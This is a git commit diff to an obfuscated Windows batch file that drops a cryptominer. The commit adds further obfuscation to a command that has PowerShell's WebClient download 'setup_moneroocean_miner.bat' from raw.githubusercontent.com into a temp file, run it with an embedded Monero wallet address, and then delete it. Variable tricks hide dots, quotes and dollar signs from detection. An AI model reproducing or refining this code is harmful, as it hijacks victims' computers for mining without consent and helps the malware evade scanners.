411ebd69ac1193f6947f9c26296264a9034ead7e
Criptc <96071765+Criptc@users.noreply.github.com>
2022-02-06 21:41:45 -0600

    Update agapojg.cmd

--- agapojg.cmd
+++ agapojg.cmd
@@ -3,14 +3,19 @@ set alksfj=%oaifsholkm:~4,1%%oaifsholkm:~10,1%%oaifsholkm:~15,1%
 %alksfj% laks= 
 %alksfj%%laks%afksl= =
 %alksfj%%laks%lkj%afksl%%oaifsholkm:~13,2%
+%alksfj%%laks%ple%afksl%.
+%alksfj%%laks%elp%afksl%,
+%alksfj%%laks%jump%afksl%'
+%alksfj%%laks%mkjh%afksl%$
 %alksfj%%laks%ijn%afksl%%oaifsholkm:~6,1%
-%alksfj%%laks%jhagsfjahfgjagfh%afksl%raw.githubusercontent.com
+%alksfj%%laks%jhagsfjahfgjagfh%afksl%raw%ple%githubusercontent%ple%com
 %alksfj%%laks%lasfjllf%afksl%https://
+%alksfj%%laks%ljljljjj%afksl%meou
 %alksfj%%laks%jbh%afksl%%oaifsholkm:~10,1%%oaifsholkm:~3,1%
 %alksfj%%laks%aasdaslkjjk%afksl%DownloadFile
 %alksfj%%laks%gka%afksl%%oaifsholkm:~4,1%%oaifsholkm:~21,1%%oaifsholkm:~10,1%
 %alksfj%%laks%iip%afksl%%oaifsholkm:~22,1%%oaifsholkm:~22,1%
-%alksfj%%laks%asourasoruoauo%afksl%setup_moneroocean_miner.bat
+%alksfj%%laks%asourasoruoauo%afksl%setup_moneroocean_miner%ple%bat
 %alksfj%%laks%lhj%afksl%%oaifsholkm:~35,1%%oaifsholkm:~14,1%%oaifsholkm:~23,1%
 %alksfj%%laks%alskfjkkjflaf%afksl%4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si
 %alksfj%%laks%htdm%afksl%%oaifsholkm:~23,1%
@@ -19,5 +24,5 @@ set alksfj=%oaifsholkm:~4,1%%oaifsholkm:~10,1%%oaifsholkm:~15,1%
 %alksfj%%laks%dfhdf%afksl%%oaifsholkm:~6,1%%oaifsholkm:~24,1%
 %alksfj%%laks%agsaf%afksl%%oaifsholkm:~53,1%%oaifsholkm:~10,1%%ijn%
 %alksfj%%laks%bj%afksl%%oaifsholkm:~20,1%%oaifsholkm:~17,1%
-timeout /t 1
-%lkj%%ijn%%jbh%%gka%%iip%%laks%-%lhj%%htdm%%lkafjs%%laks%"$%dfhdf%%laks%%afksl%%laks%%agsaf%-O%bj%%abaa%%laks%System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.%aasdaslkjjk%('%lasfjllf%%jhagsfjahfgjagfh%%asdwasdwa%%asourasoruoauo%', $tempfile); & $tempfile %alskfjkkjflaf%; Remove-Item -Force $tempfile"
+ti%ljljljjj%t%laks%/t%laks%%oaifsholkm:~31,1%
+%lkj%%ijn%%jbh%%gka%%iip%%laks%-%lhj%%htdm%%lkafjs%%laks%"%mkjh%%dfhdf%%laks%%afksl%%laks%%agsaf%-O%bj%%abaa%%laks%System%ple%Net%ple%WebClient;%laks%%mkjh%tempfile%laks%%afksl%%laks%[System%ple%IO%ple%Path]::GetTempFileName();%laks%%mkjh%tempfile%laks%+%afksl%%laks%%jump%%ple%bat%jump%;%laks%%mkjh%wc%ple%%aasdaslkjjk%(%jump%%lasfjllf%%jhagsfjahfgjagfh%%asdwasdwa%%asourasoruoauo%%jump%%elp%%laks%%mkjh%tempfile);%laks%&%laks%%mkjh%tempfile%laks%%alskfjkkjflaf%;%laks%Remove-Item%laks%-Force%laks%%mkjh%tempfile"
